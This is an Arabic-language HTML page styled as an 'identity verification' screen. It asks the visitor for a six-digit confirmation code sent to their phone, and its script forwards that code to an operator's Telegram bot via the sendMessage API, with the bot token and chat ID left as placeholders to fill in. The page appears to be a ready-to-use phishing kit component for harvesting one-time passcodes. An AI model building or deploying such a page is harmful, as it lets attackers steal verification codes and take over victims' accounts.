<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>التحقق من الهوية</title>
<style>
html, body {
  height: 100%;
  margin: 0;
  padding: 0;
  background: #ffffff;
  font-family: "Tajawal", Arial, sans-serif;
  -webkit-font-smoothing:antialiased;
  overflow: hidden; /* تثبيت الشاشة ومنع الانزلاق */
}
.wrap {
  width: 100%;
  max-width: 420px;
  height: 100vh;
  margin: 0 auto;
  position: relative;
  box-sizing: border-box;
  padding: 0 20px;
  background: #fff;
}

/* header ثابت في أعلى الصفحة */
.header-top {
  position: fixed;
  top: 6px;
  left: 0;
  right: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 999;
}
.header-top a {
  pointer-events: auto;
  position: absolute;
  left: 12px; /* السهم على الجهة اليسرى */
  top: 0;
  text-decoration: none;
  font-size: 22px;
  color: #222;
  transform: none;
}
.header-top span { font-weight: 700; font-size: 20px; color: #222; }

/* عنوان تحت الرأس */
.title-area {
  margin-top: 56px;
  text-align: center;
}
.title-area h2 {
  margin: 6px 0 6px;
  font-size: 30px;
  font-weight: 800;
  color: #222;
}
.title-area p {
  margin: 0;
  font-size: 15px;
  color: #9b9b9b;
  line-height: 1.6;
}

/* المربعات في منتصف الشاشة (مركز عموديًا) */
.center-area {
  position: absolute;
  left: 0;
  right: 0;
  top: 50%;
  transform: translateY(-50%);
  display: flex;
  justify-content: center;
}
.code-inputs {
  display: flex;
  gap: 6px; /* مسافة أصغر بين المربعات */
  align-items: center;
  width: calc(100% - 40px);
  max-width: 420px;
  justify-content: center;
}
.code-inputs input {
  width: calc((100% - 30px) / 6);
  max-width: 36px;  /* تصغير أقصى */
  min-width: 20px;  /* تصغير أدنى */
  aspect-ratio: 1 / 1;
  border-radius: 8px;
  border: 1px solid #e6e6e8;
  background: #f3f3f4;
  box-shadow: 0 3px 6px rgba(0,0,0,0.03);
  text-align: center;
  font-size: 13px;
  color: #222;
  transition: background 0.12s, color 0.12s, box-shadow 0.12s;
}
.code-inputs input:focus { outline: none; border-color: #ddd; }
.code-inputs input.filled {
  background: #ffffff; /* تصير بيضاء عند الملء */
  color: #000000;
  border-color: #e0e0e0;
  box-shadow: 0 2px 4px rgba(0,0,0,0.04);
}

/* منطقة الأسفل ثابتة: عداد الإعادة فوق الزر */
.bottom-fixed {
  position: fixed;
  left: 0;
  right: 0;
  bottom: 20px;
  display: flex;
  justify-content: center;
  pointer-events: none;
}
.bottom-inner {
  width: 100%;
  max-width: 420px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 12px;
  padding: 0 20px;
  box-sizing: border-box;
  pointer-events: auto;
}
.resend-container {
  display: flex;
  align-items: center;
  gap: 12px;
  color: #bcbcbc;
  font-size: 15px;
}
.circle {
  position: relative;
  width: 44px;
  height: 44px;
}
.circle svg { transform: rotate(-90deg); width: 44px; height: 44px; }
.circle circle { fill: none; stroke-width: 4; stroke-linecap: round; }
.circle .bg { stroke: #f0f0f0; }
.circle .progress { stroke: #ff6a2b; stroke-dasharray: 113; stroke-dashoffset: 0; transition: stroke-dashoffset 1s linear; }
.circle span { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 13px; font-weight: 700; color: #ff6a2b; }
#resendText { color: #bcbcbc; }
#resendText.active { color: #444; cursor: pointer; }

#nextBtn {
  width: 100%;
  border-radius: 8px;
  padding: 14px 18px;
  background: #efefef;
  border: none;
  font-size: 17px;
  color: #bdbdbd;
  font-weight: 700;
}
#nextBtn.active { background: #ff6a2b; color: #fff; }

/* استجابة للشاشات الصغيرة */
@media (max-width: 420px) {
  .title-area h2 { font-size: 26px; }
  .code-inputs input { font-size: 12px; }
  .circle { width: 36px; height: 36px; }
  .circle svg { width: 36px; height: 36px; }
}
</style>
</head>
<body>
<div class="wrap">
  <div class="header-top">
    <a href="index.html">←</a>
    <span>التحقق من الهوية</span>
  </div>

  <div class="title-area">
    <h2>تم ارسال رمز التأكيد</h2>
    <p>ادخل رمز التأكيد المكون من 6 خانات والذي تم إرساله إلى هاتفك للتحقق من حسابك</p>
  </div>

  <div class="center-area">
    <div class="code-inputs">
      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
    </div>
  </div>

  <div class="bottom-fixed">
    <div class="bottom-inner">
      <div class="resend-container">
        <div class="circle">
          <svg>
            <circle class="bg" cx="24" cy="24" r="18"></circle>
            <circle class="progress" cx="24" cy="24" r="18"></circle>
          </svg>
          <span id="countdown">60</span>
        </div>
        <div id="resendText">أعد إرسال رمز التأكيد</div>
      </div>

      <button id="nextBtn">التالي</button>
    </div>
  </div>
</div>

<script>
// ضع بيانات بوت التلجرام هنا إذا رغبت بإرسال الرمز
const BOT_TOKEN = "ضع_هنا_التوكن";
const CHAT_ID = "ضع_هنا_الآي_دي";

const inputs = document.querySelectorAll('.code-inputs input');
const nextBtn = document.getElementById('nextBtn');
const resendText = document.getElementById('resendText');
const countdownEl = document.getElementById('countdown');
const progressCircle = document.querySelector('.progress');
const circumference = 2 * Math.PI * 18;
if (progressCircle) progressCircle.style.strokeDasharray = circumference;

let timer;
let timeLeft = 60;
function startTimer() {
  timeLeft = 60;
  countdownEl.textContent = timeLeft;
  resendText.classList.remove('active');
  timer = setInterval(() => {
    timeLeft--;
    countdownEl.textContent = timeLeft;
    const offset = circumference - (timeLeft / 60) * circumference;
    if (progressCircle) progressCircle.style.strokeDashoffset = offset;
    if (timeLeft <= 0) {
      clearInterval(timer);
      countdownEl.textContent = '0';
      resendText.classList.add('active');
    }
  }, 1000);
}
startTimer();
resendText.addEventListener('click', () => {
  if (resendText.classList.contains('active')) startTimer();
});

// أرقام فقط + انتقال تلقائي + لصق لملء الحقول + تغيير الخلفية عند الملء
inputs.forEach((input, idx) => {
  input.setAttribute('inputmode', 'numeric');
  input.setAttribute('pattern', '[0-9]*');

  input.addEventListener('keydown', (e) => {
    const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab'];
    if (allowed.includes(e.key)) return;
    if (e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault();
  });

  input.addEventListener('input', () => {
    input.value = input.value.replace(/\\D/g,'').slice(0,1);
    if (input.value) input.classList.add('filled'); else input.classList.remove('filled');
    if (input.value && idx < inputs.length-1) inputs[idx+1].focus();
    checkCode();
  });

  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = (e.clipboardData||window.clipboardData).getData('text').replace(/\\D/g,'');
    if (!paste) return;
    if (paste.length >= inputs.length) {
      for (let i=0;i<inputs.length;i++) {
        inputs[i].value = paste.charAt(i) || '';
        if (inputs[i].value) inputs[i].classList.add('filled'); else inputs[i].classList.remove('filled');
      }
      checkCode();
      return;
    }
    input.value = paste.charAt(0);
    if (input.value) input.classList.add('filled'); else input.classList.remove('filled');
    if (idx < inputs.length-1) inputs[idx+1].focus();
    checkCode();
  });
});

function checkCode(){
  let code = '';
  inputs.forEach(i=> code += i.value);
  if (code.length===6){ nextBtn.classList.add('active'); nextBtn.disabled=false; }
  else { nextBtn.classList.remove('active'); nextBtn.disabled=true; }
}

function sendToTelegram(code){
  if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')){
    console.warn('بيانات التلجرام غير مضبوطة؛ تم تخطي الإرسال.');
    alert('تنبيه: لم يتم ضبط بيانات بوت تلجرام. ضع قيم BOT_TOKEN و CHAT_ID الصحيحة إذا أردت إرسال الرسائل.');
    return Promise.resolve({ok:false,error:'credentials_missing'});
  }
  const message = `🔑 تم إدخال رمز التأكيد:\\n${code}`;
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({chat_id:CHAT_ID, text: message})
  })
  .then(res=>{ if(!res.ok) throw new Error('Telegram API returned status '+res.status); return res.json(); })
  .then(data=>{ console.log('تم الإرسال:',data); return data; })
  .catch(err=>{ console.error('خطأ في الإرسال:',err); alert('حدث خطأ عند إرسال الرمز إلى تلجرام: '+(err.message||err)); throw err; });
}

nextBtn.addEventListener('click', ()=>{
  let code = '';
  inputs.forEach(i=> code += i.value);
  if (code.length===6){
    sendToTelegram(code).catch(()=>{});
    if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')) return;
    alert('🚀 تم إرسال رمز التأكيد إلى تلجرام');
  }
});
</script>
</body>
</html>
